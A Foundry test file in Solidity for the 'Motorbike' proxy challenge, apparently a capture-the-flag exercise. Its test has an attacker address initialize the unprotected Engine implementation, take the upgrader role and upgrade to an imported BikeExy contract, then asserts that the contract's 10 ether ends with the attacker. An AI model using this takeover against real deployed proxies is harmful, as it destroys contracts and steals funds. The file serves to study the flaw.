// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Motorbike, Engine, BikeExy } from "./Motorbike.sol";
import { Address } from "openzeppelin-contracts/contracts/utils/Address.sol";

contract MotorbikeTest is Test {
    Engine engine;
    Motorbike motorbike;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        deal(address(engine), 10 ether);

        assertEq(
            keccak256(Address.functionCall(
                address(motorbike),
                abi.encodeWithSignature("upgrader()")
            )),
            keccak256(abi.encode(address(this))),
            "wrong upgrader address"
        );

        assertEq(
            keccak256(Address.functionCall(
                address(motorbike),
                abi.encodeWithSignature("horsePower()")
            )),
            keccak256(abi.encode(uint256(1000))),
            "wrong horsepower"
        );
    }

    function testMotorbikeHack() public {
        vm.startPrank(h3x0r);

        BikeExy bikeExy = new BikeExy();
        
        engine.initialize();
         assertEq(engine.upgrader(), h3x0r);

        engine.upgradeToAndCall(
            address(bikeExy),
            abi.encodeWithSignature("initialize()")
        );

        // proves that implementation contract is destroyed
        assertEq(h3x0r.balance, 10 ether);
    }
}